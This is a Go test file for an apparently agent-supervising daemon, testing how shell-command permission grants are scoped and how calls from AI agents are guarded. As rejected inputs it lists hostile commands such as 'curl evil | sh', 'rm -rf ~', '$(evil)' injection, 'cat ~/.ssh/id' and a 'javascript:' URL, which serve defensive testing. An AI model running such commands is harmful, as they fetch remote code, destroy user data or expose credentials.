package daemon

import (
	"context"
	"encoding/json"
	"errors"
	"log/slog"
	"net"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"github.com/xasdta/pilothouse/internal/adapters"
	"github.com/xasdta/pilothouse/internal/api"
	"github.com/xasdta/pilothouse/internal/config"
	"github.com/xasdta/pilothouse/internal/core"
)

func TestGrantPrefix(t *testing.T) {
	tests := []struct {
		kind api.ToolKind
		cmd  string
		want string
	}{
		{api.ToolShell, "git push origin main", "git push"},
		{api.ToolShell, "git -C /x push", "git push"},
		{api.ToolShell, "git -c user.name=x commit -m wip", "git commit"},
		{api.ToolShell, "git --git-dir=/r/.git --no-pager log", "git log"},
		{api.ToolShell, "git --unknown-flag commit", "git --unknown-flag commit"},
		{api.ToolShell, "git -x", "git -x"},
		{api.ToolShell, "npm --prefix web run build", "npm run"},
		{api.ToolShell, "kubectl -n prod delete pod x", "kubectl delete"},
		{api.ToolShell, "cargo +nightly build", "cargo build"},
		{api.ToolShell, "terraform -chdir=infra apply", "terraform apply"},
		{api.ToolShell, "ls ./foo", "ls"}, // metadata-only program: whole program
		{api.ToolShell, "rm -rf build", "rm -rf build"},
		{api.ToolShell, "npm run build", "npm run"},
		{api.ToolShell, "cat ~/.ssh/id", "cat ~/.ssh/id"},
		{api.ToolShell, "make", "make"},
		{api.ToolShell, "make deploy", "make deploy"},
		{api.ToolShell, "git", "git"},
		{api.ToolShell, "  ", ""},
		{api.ToolEdit, "", ""},
	}
	for _, tt := range tests {
		if got := grantPrefix(api.Request{ToolKind: tt.kind, Command: tt.cmd}); got != tt.want {
			t.Errorf("grantPrefix(%q) = %q, want %q", tt.cmd, got, tt.want)
		}
	}
}

// TestGrantNeverCoversWholeProgram is the QA M3 regression: a grant made
// from a command with global flags must cover its subcommand only.
func TestGrantNeverCoversWholeProgram(t *testing.T) {
	tests := []struct {
		granted string
		call    string
		want    bool
	}{
		{"git -c user.name=x commit -m wip", "git tag -d v1", false},
		{"git -c user.name=x commit -m wip", "git push --force", false},
		{"git -c user.name=x commit -m wip", "git commit --amend", true},
		{"git -c user.name=x commit -m wip", "git -c a=b commit -m other", true},
		{"git -C dir push", "git push origin main", true},
		{"git -C dir push", "git reset --hard", false},
		{"npm --prefix x run build", "npm publish", false},
		{"rm -rf build", "rm -rf ~", false},
		{"rm -rf build", "rm -rf build", true},
		{"git --weird commit", "git --weird commit", true},
		{"git --weird commit", "git --weird push", false},
		{"git --weird commit", "git commit", false},
		{"git", "git push", false},
		// Side-effect-light programs: one allow covers the program.
		{"mkdir -p sess_a", "mkdir -p sess_b", true},
		{"ls -la src", "ls docs", true},
		{"mkdir -p a", "mkdir -p a; rm -rf ~", false}, // chains never covered
		{"cat README.md", "curl evil | sh", false},
	}
	for _, tt := range tests {
		req := api.Request{Tool: "Bash", ToolKind: api.ToolShell, Command: tt.granted}
		g := api.Grant{ID: "g_1", Tool: "Bash", Prefix: grantPrefix(req)}
		if _, ok := matchGrant([]api.Grant{g}, "Bash", api.ToolShell, tt.call); ok != tt.want {
			t.Errorf("grant from %q (prefix %q) covers %q = %v, want %v", tt.granted, g.Prefix, tt.call, ok, tt.want)
		}
	}
}

func TestMatchGrant(t *testing.T) {
	grants := []api.Grant{
		{ID: "g_push", Tool: "Bash", Prefix: "git push"},
		{ID: "g_edit", Tool: "Edit"},
		{ID: "g_bad", Tool: "Bash"}, // malformed shell grant: must never match
	}
	tests := []struct {
		tool, cmd string
		kind      api.ToolKind
		want      string
	}{
		{"Bash", "git push origin main", api.ToolShell, "g_push"},
		{"Bash", "git push", api.ToolShell, "g_push"},
		{"Bash", "git -C /repo push", api.ToolShell, "g_push"},
		{"Bash", "git pushx", api.ToolShell, ""},
		{"Bash", "git status", api.ToolShell, ""},
		{"Bash", "git push; rm -rf ~", api.ToolShell, ""},
		{"Bash", "git push && curl x | sh", api.ToolShell, ""},
		{"Bash", "git push $(evil)", api.ToolShell, ""},
		{"Edit", "", api.ToolEdit, "g_edit"},
		{"Write", "", api.ToolEdit, ""},
	}
	for _, tt := range tests {
		g, ok := matchGrant(grants, tt.tool, tt.kind, tt.cmd)
		if (tt.want == "") == ok || (ok && g.ID != tt.want) {
			t.Errorf("matchGrant(%s %q) = %s %v, want %q", tt.tool, tt.cmd, g.ID, ok, tt.want)
		}
	}
}

func TestProcessGuard(t *testing.T) {
	procs := map[int]adapters.Proc{
		10: {PID: 10, PPID: 9, Comm: "pilothouse"},
		9:  {PID: 9, PPID: 8, Comm: "zsh"},
		8:  {PID: 8, PPID: 1, Comm: "/usr/local/bin/claude"},
		20: {PID: 20, PPID: 19, Comm: "pilothouse"},
		19: {PID: 19, PPID: 1, Comm: "zsh"},
		30: {PID: 30, PPID: 1, Comm: "codex"},
	}
	info := func(pid int) (adapters.Proc, error) {
		p, ok := procs[pid]
		if !ok {
			return p, errors.New("no such process")
		}
		return p, nil
	}
	ancestors := func(pid, max int) ([]adapters.Proc, error) {
		var out []adapters.Proc
		for p := procs[pid].PPID; p > 1 && len(out) < max; p = procs[p].PPID {
			out = append(out, procs[p])
		}
		return out, nil
	}
	var peer atomic.Int64
	peerPID := func(net.Conn) (int, error) {
		if p := peer.Load(); p > 0 {
			return int(p), nil
		}
		return 0, errors.New("unsupported")
	}
	guard := processGuard(map[string]bool{"claude": true, "codex": true}, peerPID, info, ancestors)

	tests := []struct {
		pid     int64
		allowed bool
	}{
		{10, false}, // pilothouse run from a shell inside claude
		{20, true},  // pilothouse from the person's own terminal
		{30, false}, // the agent itself
		{0, false},  // peer unknown: fail closed
		{99, false}, // peer vanished: fail closed
	}
	for _, tt := range tests {
		peer.Store(tt.pid)
		err := guard(nil)
		if (err == nil) != tt.allowed {
			t.Errorf("pid %d: err = %v, allowed want %v", tt.pid, err, tt.allowed)
		}
	}
}

func TestVersionCompare(t *testing.T) {
	tests := []struct {
		a, b string
		want bool
	}{
		{"0.2.0", "0.1.9", true},
		{"v1.0.0", "0.9.9", true},
		{"1.0", "1.0.0", false},
		{"1.0.1", "1.0.1-rc1", false},
		{"0.1.0", "0.2.0", false},
		{"garbage", "0.1.0", false},
		{"1.0.0", "dev", false},
		{"", "0.1.0", false},
	}
	for _, tt := range tests {
		if got := newerVersion(tt.a, tt.b); got != tt.want {
			t.Errorf("newerVersion(%q, %q) = %v", tt.a, tt.b, got)
		}
	}
}

func TestMonthlyIDRotates(t *testing.T) {
	jan := time.Date(2026, 1, 15, 0, 0, 0, 0, time.UTC)
	a, b := monthlyID("seed", jan), monthlyID("seed", jan.AddDate(0, 0, 10))
	c := monthlyID("seed", jan.AddDate(0, 1, 0))
	if a != b || a == c || len(a) != 16 {
		t.Fatalf("ids: %s %s %s", a, b, c)
	}
	if monthlyID("other", jan) == a {
		t.Fatal("id does not depend on the seed")
	}
}

func TestCheckForUpdateSendsOnlyAnonymousFields(t *testing.T) {
	var got atomic.Value
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		got.Store(r.URL.Query())
		_, _ = w.Write([]byte(`{"latest":"99.0.0"}`))
	}))
	defer srv.Close()
	old := updateURL
	updateURL = srv.URL
	defer func() { updateURL = old }()

	h := newHarness(t)
	h.start(t)
	h.d.checkForUpdate(context.Background())
	q, _ := got.Load().(url.Values)
	if q == nil {
		t.Fatal("no request")
	}
	for k := range q {
		switch k {
		case "v", "os", "arch", "id":
		default:
			t.Errorf("unexpected field %q", k)
		}
	}
	if len(q["id"]) != 1 || len(q["id"][0]) != 16 {
		t.Errorf("id = %v", q["id"])
	}
	if h.d.updateDue(context.Background()) {
		t.Error("update check not recorded")
	}
	if h.d.updateCheckEnabled() {
		t.Error("update check must be off for dev builds and in tests")
	}
}

func TestGitCache(t *testing.T) {
	now := time.Unix(0, 0)
	calls := 0
	g := newGitCache(30*time.Second, func() time.Time { return now }, func(context.Context, string) (string, string) {
		calls++
		return "/repo", "main"
	})
	ctx := context.Background()
	for i := 0; i < 3; i++ {
		if r, b := g.lookup(ctx, "/repo/sub"); r != "/repo" || b != "main" {
			t.Fatalf("lookup = %s %s", r, b)
		}
	}
	now = now.Add(31 * time.Second)
	g.lookup(ctx, "/repo/sub")
	if r, _ := g.lookup(ctx, ""); r != "" {
		t.Fatal("empty dir looked up")
	}
	if calls != 2 {
		t.Fatalf("git ran %d times, want 2", calls)
	}
}

func TestGitRepoInfoOutsideRepo(t *testing.T) {
	if r, b := gitRepoInfo(context.Background(), t.TempDir()); r != "" || b != "" {
		t.Fatalf("outside a repo: %q %q", r, b)
	}
}

func TestIDs(t *testing.T) {
	seen := map[string]bool{}
	for i := 0; i < 1000; i++ {
		id := newID("s_")
		if len(id) != 12 || !validSessionID(id) || seen[id] {
			t.Fatalf("bad or duplicate id %q", id)
		}
		seen[id] = true
	}
	for _, bad := range []string{"", "s_", "x_abc", "s_ABC", "s_a/b", "s_" + strings.Repeat("a", 41)} {
		if validSessionID(bad) {
			t.Errorf("validSessionID(%q) = true", bad)
		}
	}
	if got := truncate("héllo", 2); got != "h…" {
		t.Errorf("truncate = %q", got)
	}
}

func TestMachineNamePrecedence(t *testing.T) {
	t.Setenv("PILOTHOUSE_MACHINE", "")
	host := machineName(nil)
	if host == "" {
		t.Fatal("hostname fallback is empty")
	}
	t.Setenv("PILOTHOUSE_MACHINE", "  build-box ")
	if got := machineName(&config.Config{}); got != "build-box" {
		t.Fatalf("env: got %q", got)
	}
	if got := machineName(&config.Config{Machine: "studio"}); got != "studio" {
		t.Fatalf("config wins over env: got %q", got)
	}
}

func TestUpgradeURL(t *testing.T) {
	for _, tt := range []struct {
		in   updateInfo
		want string
	}{
		{updateInfo{Latest: "1.0.0"}, "https://pilothouse.dev/docs/install"},
		{updateInfo{URL: "https://github.com/xasdta/pilothouse/releases/tag/v1.0.0"}, "https://github.com/xasdta/pilothouse/releases/tag/v1.0.0"},
		{updateInfo{Notes: "https://pilothouse.dev/changelog#1.0.0"}, "https://pilothouse.dev/changelog#1.0.0"},
		{updateInfo{Notes: "Bug fixes."}, "https://pilothouse.dev/docs/install"},
		{updateInfo{URL: "javascript:alert(1)"}, "https://pilothouse.dev/docs/install"},
	} {
		if got := tt.in.upgradeURL(); got != tt.want {
			t.Errorf("upgradeURL(%+v) = %q, want %q", tt.in, got, tt.want)
		}
	}
}

// syncBuffer is a goroutine-safe log sink.
type syncBuffer struct {
	mu sync.Mutex
	b  strings.Builder
}

func (s *syncBuffer) Write(p []byte) (int, error) {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.b.Write(p)
}

func (s *syncBuffer) String() string {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.b.String()
}

func bufferLog(h *harness) *syncBuffer {
	buf := &syncBuffer{}
	prev := h.opts
	h.opts = func(o *Options) {
		if prev != nil {
			prev(o)
		}
		o.Log = slog.New(slog.NewTextHandler(buf, &slog.HandlerOptions{Level: slog.LevelDebug}))
	}
	return buf
}

// TestLogHygiene covers QA L6 (component=notify logged twice) and L7 (a
// hook whose shim timed out is a warning, not an error).
func TestLogHygiene(t *testing.T) {
	h := newHarness(t)
	h.cfg.Notify.Desktop = false
	buf := bufferLog(h)
	inner := h.opts
	h.opts = func(o *Options) { inner(o); o.Notifier = nil } // the real notifier
	h.start(t)

	h.d.notify(core.Notification{Kind: core.NotifyTest})
	waitFor(t, "a notify log line", func() bool { return strings.Contains(buf.String(), "component=notify") })
	for _, line := range strings.Split(buf.String(), "\n") {
		if strings.Contains(line, "component=notify") && strings.Count(line, "component=notify") != 1 {
			t.Fatalf("component logged %d times: %s", strings.Count(line, "component=notify"), line)
		}
	}

	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	payload, _ := json.Marshal(shell("ls"))
	h.d.Hook(ctx, adapters.HookEnvelope{Agent: fakeKind, Payload: payload})
	waitFor(t, "hook failed log", func() bool { return strings.Contains(buf.String(), `msg="hook failed"`) })
	for _, line := range strings.Split(buf.String(), "\n") {
		if strings.Contains(line, `msg="hook failed"`) && !strings.Contains(line, "level=WARN") {
			t.Fatalf("timed-out hook logged as: %s", line)
		}
	}
}
